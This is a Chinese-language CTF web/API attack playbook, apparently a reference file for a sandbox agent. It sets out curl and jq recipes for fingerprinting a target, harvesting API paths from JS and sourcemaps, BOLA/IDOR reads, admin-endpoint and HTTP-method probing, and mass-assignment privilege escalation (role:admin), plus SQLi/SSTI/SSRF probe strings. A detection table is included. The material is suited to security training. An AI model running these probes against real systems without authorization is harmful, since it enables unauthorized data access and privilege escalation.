# Web/API 快速路线：判类型 → 找接口 → 判认证 → 三个验证动作

> 被 `ctf-sandbox-orchestrator` 引用。目标是**在 15 分钟内确定打法**，而不是"全面扫描"。
> 三条主线：这是传统 Web、SPA，还是 API-only。

## 一、判类型（3 分钟）

```bash
# 一次拿全基础特征
curl -s -D - https://target/ -o body.html | head -30
curl -s https://target/ | head -c 1500
curl -s -i https://target/nonexistent-xyz-123 | head -20
```

| 特征 | 类型 | 打法 |
| --- | --- | --- |
| 服务端返回完整 HTML（含表单、`<a href>`） | **传统 Web（SSR）** | 表单/参数注入、文件包含、上传、SSRF |
| HTML 里只有 `<div id="root">` + 一堆 JS | **SPA** | 先读 JS 找 API 路径，再打 API |
| `/api/*` 返回 JSON，根路径 404 或 JSON | **API-only** | 直接打 API（BOLA/BFLA/认证） |
| 根路径 200 但 body 是 `<!DOCTYPE html>`，浅层结构 | 静态站/占位页 | 找真实入口（子域/路径/端口） |
| `Server: Kestrel` + `X-Powered-By` 空 | ASP.NET Core | 看 `/swagger`、`/health` |

```bash
# 区分 SPA 与 API-only
curl -s https://target/api/v1/ -H 'Accept: application/json' | head -c 200
curl -s https://target/api/users -H 'Accept: application/json' | head -c 200
# JSON → 真的 API
# <!DOCTYPE html> → SPA fallback（所有路径都返回 index.html）

# 看是否有 SSR 的痕迹（服务端渲染的 HTML 里有数据）
curl -s https://target/ | grep -oE '<title>[^<]*</title>|window\.__INITIAL_STATE__|__NEXT_DATA__'
```

## 二、找接口（5 分钟）

### 2.1 从 JS 里挖（SPA 的关键一步）

```bash
# 1) 列出所有 JS
curl -s https://target/ | grep -oE 'src="[^"]+\.js[^"]*"' | sed 's/src="//;s/"$//' | sort -u

# 2) 批量下载
mkdir -p js && cd js
curl -s https://target/ | grep -oE '(src|href)="[^"]+\.js[^"]*"' | sed 's/.*="//;s/"$//' | while read u; do
  case "$u" in http*) curl -s "$u" -O ;; /*) curl -s "https://target$u" -O ;; *) curl -s "https://target/$u" -O ;; esac
done

# 3) 挖 API 路径
grep -hoE '"/?(api|v[0-9])/[a-zA-Z0-9_/{}$.-]+"' *.js | tr -d '"' | sort -u | head -60

# 4) 挖完整 URL
grep -hoE 'https?://[a-zA-Z0-9.-]+/[a-zA-Z0-9_/.-]*' *.js | sort -u | head -40

# 5) 挖 fetch/axios 调用
grep -hoE '(fetch|axios\.[a-z]+)\(["'"'"'`][^"'"'"'`]+' *.js | head -40
```

```bash
# 若有 sourcemap，直接还原源码（最高价值）
curl -s https://target/static/js/main.js | tail -2 | grep -oE 'sourceMappingURL=[^ ]+'
# 下载 .map 后用 sourcemap 工具还原
npx source-map-explorer main.js main.js.map  # 或
node -e "
const {SourceMapConsumer}=require('source-map');
require('fs').readFileSync('main.js.map','utf8')&&console.log('has map');"
```

### 2.2 从文档里挖

```bash
# 常见文档路径
for p in /swagger.json /swagger/v1/swagger.json /openapi.json /api-docs /v3/api-docs \
         /docs /redoc /graphql /graphiql /api/swagger.json /swagger-ui.html /swagger-ui/; do
  printf '%-28s ' "$p"
  curl -s -o /dev/null -w '%{http_code} %{content_type}\n' "https://target$p"
done
```

```bash
# 拿到 OpenAPI 后，一次列全接口
curl -s https://target/openapi.json | jq -r '.paths | to_entries[] | "\(.key) \(.value|keys|join(","))"'
```

### 2.3 从 robots / sitemap 挖

```bash
curl -s https://target/robots.txt
curl -s https://target/sitemap.xml | grep -oE '<loc>[^<]+' | sed 's/<loc>//'
```

### 2.4 从响应头挖（隐藏的后端地址）

```bash
curl -sI https://target/ | grep -iE 'x-|via|server|link|x-backend|x-upstream'
# Link: <https://api.internal/...>; rel="preconnect"  ← 直接给出后端
```

## 三、判认证方式（3 分钟）

| 方式 | 判据 | 测试重点 |
| --- | --- | --- |
| **Cookie + Session** | `Set-Cookie: JSESSIONID`/`PHPSESSID`/`connect.sid` | 会话固定、CSRF、越权 |
| **JWT in Authorization** | `Authorization: Bearer eyJ...` | alg/claim/kid（见 `jwt-oauth-testing`） |
| **API Key in header** | `X-API-Key: ...` | 泄露、越权、无过期 |
| **OAuth/OIDC** | 302 到 IdP；`/oauth/authorize` | redirect/state/PKCE（见 `oauth-oidc-chain`） |
| **mTLS** | 客户端证书 | 证书是否能被复用/伪造 |
| **无认证** | 直接 200 | 全量测越权 |
| **Basic Auth** | `WWW-Authenticate: Basic` | 爆破、明文传输 |

```bash
# 一次判定
curl -s -i https://target/api/v1/me | head -15
# 401 + WWW-Authenticate: Bearer  → JWT
# 401 + WWW-Authenticate: Basic   → Basic
# 302 + Location: /login           → 会话
# 200                              → 无认证（或已带 cookie）
```

```bash
# 注册两个账号，拿两份凭证（几乎所有越权测试的基础）
curl -s -X POST https://target/api/register -H 'Content-Type: application/json' \
  -d '{"username":"a1","password":"Passw0rd!","email":"a1@x.com"}'
curl -s -X POST https://target/api/login -H 'Content-Type: application/json' \
  -d '{"username":"a1","password":"Passw0rd!"}' | tee a1.json
```

## 四、最快的三个验证动作

**这三个动作覆盖 70% 的实际漏洞**。做完再决定深入哪里。

### 动作 1：越权读别人的对象（BOLA/IDOR）

```bash
TOKEN_A=$(jq -r '.token // .access_token' a1.json)
TOKEN_B=$(jq -r '.token // .access_token' b1.json)

# 用自己的 ID 与别人的 ID 各读一次
curl -s https://target/api/v1/users/1001 -H "Authorization: Bearer $TOKEN_A" | jq .
curl -s https://target/api/v1/users/1002 -H "Authorization: Bearer $TOKEN_A" | jq .
# 第二次返回数据 → BOLA
```

```bash
# 若 ID 是 UUID，从自己的响应里拿别人的引用（分享链接/关联对象/日志）
curl -s https://target/api/v1/orders -H "Authorization: Bearer $TOKEN_A" | jq '.orders[].id'
```

### 动作 2：低权打管理端点（BFLA）

```bash
for p in /api/v1/admin/users /api/v1/internal/metrics /api/admin/audit /api/v1/users/export; do
  printf '%-28s ' "$p"
  curl -s -o /dev/null -w '%{http_code}\n' "https://target$p" -H "Authorization: Bearer $TOKEN_A"
done
```

```bash
# 方法维度（最容易漏）
for m in GET POST PUT PATCH DELETE; do
  printf '%-8s ' "$m"
  curl -s -o /dev/null -w '%{http_code}\n' -X $m "https://target/api/v1/admin/users" \
    -H "Authorization: Bearer $TOKEN_A" -H 'Content-Type: application/json' -d '{}'
done
```

### 动作 3：改一个不该改的字段（批量赋值）

```bash
# 抄自己的完整对象，注入敏感字段，回写，回读
curl -s https://target/api/v1/users/me -H "Authorization: Bearer $TOKEN_A" | jq . > me.json
jq '. + {role:"admin", is_admin:true, tenant_id:"t-0001", credits:99999}' me.json > evil.json
curl -s -X PATCH https://target/api/v1/users/me -H "Authorization: Bearer $TOKEN_A" \
  -H 'Content-Type: application/json' --data @evil.json | jq .
curl -s https://target/api/v1/users/me -H "Authorization: Bearer $TOKEN_A" | jq '{role,is_admin,tenant_id,credits}'
```

**回读确认**是必须的。返回体里"回显"了不算。

## 五、按类型分流的下一步

### 5.1 传统 Web（SSR）

| 入口 | 下一步 |
| --- | --- |
| 表单（登录/搜索/评论） | SQLi、SSTI、XSS、命令注入 |
| 文件参数（`?page=`、`?file=`） | LFI/RFI、路径穿越 |
| URL 参数（`?url=`、`?image=`） | SSRF |
| 上传表单 | 见 `file-parser-chain` |
| 错误页含堆栈 | 见 `routing-runtime`（debug 判断） |

```bash
# 快速探三类注入
curl -s "https://target/search?q=1'" | grep -iE 'sql|syntax|error'
curl -s -G "https://target/page" --data-urlencode 'name={{7*7}}' | grep -o 49
curl -s "https://target/fetch?url=http://127.0.0.1:80/" -o /dev/null -w '%{time_total}\n'
```

### 5.2 SPA

| 下一步 | 依据 |
| --- | --- |
| 读 JS 找全部 API | §2.1 |
| 找签名算法 | `js-reverse` |
| 打 API 的 BOLA/BFLA | §4 |
| 找硬编码密钥 | `grep -rE 'apiKey|secret|token' js/` |
| 找隐藏路由 | 从前端路由表（`react-router`/`vue-router` 的 paths） |

```bash
# 前端路由表
grep -hoE 'path:\s*"[^"]+"' js/*.js | sort -u | head -30
grep -hoE 'component:\s*[A-Za-z]+' js/*.js | head -20
```

### 5.3 API-only

| 下一步 | 依据 |
| --- | --- |
| 枚举全部端点（OpenAPI/爆破） | §2.2 |
| 每个端点测 BOLA/BFLA | §4 |
| 测速率限制 | 并发 50 看 429 |
| 测 GraphQL（若有 `/graphql`） | `rest-graphql-testing` |
| 测版本漂移（`/v1` vs `/v2`） | `graphql-rpc-drift` |

## 六、验伤：三个动作的成功标准

| 动作 | 成功证据 | 假象 |
| --- | --- | --- |
| BOLA | 返回**别人的**唯一标识字段（email/手机号/金额） | 200 但空对象；返回自己的数据 |
| BFLA | 管理端点返回业务数据或状态变更 | 200 + HTML（SPA fallback） |
| 批量赋值 | 回读到新值，或行为变化（能进管理页） | PATCH 200 但字段被 DTO 丢弃 |

**统一原则**：`200` 不等于成功。要看**响应体语义** + **回读确认**。

## 七、检测视角

| 动作 | 日志 | 信号 |
| --- | --- | --- |
| 类型探测 | WAF | 对 `/openapi.json`、`/swagger`、`/api-docs` 的枚举 |
| JS 批量下载 | CDN/网关 | 单 IP 短时间内拉取全部 `*.js` |
| BOLA | 应用审计 | 同一 token 访问不连续的对象 ID |
| BFLA | 网关 | 低权主体访问 `/admin/*` 返回 2xx |
| 批量赋值 | 应用审计（字段级） | 请求 body 含 schema 外字段 |
| 限流测试 | 网关 | 单 IP 单端点高频请求 |

## 八、常见坑

1. **只看首页就判"静态站"**——很多应用把真实入口放在子域或特定路径（`/app`、`/console`）。
2. **把 SPA fallback 当 API**——所有路径 200 + HTML。用 `Accept: application/json` 区分。
3. **JS 只下载入口文件**——现代构建是 chunk 分割，真实 API 路径在 `chunk-*.js` 里。要全量下载。
4. **忘了 sourcemap**——`.map` 文件常被遗漏部署，能直接还原源码（含注释里的内网地址）。
5. **只测 GET**——写操作在 POST/PATCH/DELETE。`OPTIONS` 先看 `Allow`。
6. **没注册两个账号**——越权测试需要两个身份。先注册，别急着打。
7. **ID 是 UUID 就放弃**——从自己的列表、分享链接、API 响应里的关联字段拿别人的 UUID。
8. **判完类型不记录**——判断依据要写进证据（"根路径返回 `<div id=root>` + `main.js` 含 `fetch('/api/v1/')` → SPA"），否则无法复核。